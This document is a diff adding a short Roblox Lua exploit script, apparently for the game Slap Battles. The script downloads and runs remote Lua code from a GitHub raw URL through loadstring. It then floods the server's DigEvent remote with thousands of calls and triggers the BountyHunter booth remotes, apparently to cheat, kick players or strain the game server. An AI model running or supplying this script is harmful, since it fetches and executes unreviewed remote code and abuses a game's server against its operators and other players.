@@ -1,0 +1,25 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Dramukan/SlapBattle_Scripts/main/kick_Chip")))() 
+for i = 1,3000 do
+local args = {
+    [1] = {
+        ["index"] = 1,
+        ["cf"] = CFrame.new(-0, -0, -0)
+    }
+}
+
+game:GetService("ReplicatedStorage").DigEvent:FireServer(unpack(args))
+
+end
+	workspace.BountyHunterRoom.BountyHunterBooth._configPart.OpenRemote:InvokeServer()
+	wait()
+	workspace.BountyHunterRoom.BountyHunterBooth._configPart.LeaveRemote:FireServer()
+for i = 1,1000 do
+local args = {
+    [1] = {
+        ["index"] = 1,
+        ["cf"] = CFrame.new(-0, -0, -0)
+    }
+}
+
+game:GetService("ReplicatedStorage").DigEvent:FireServer(unpack(args))
+end
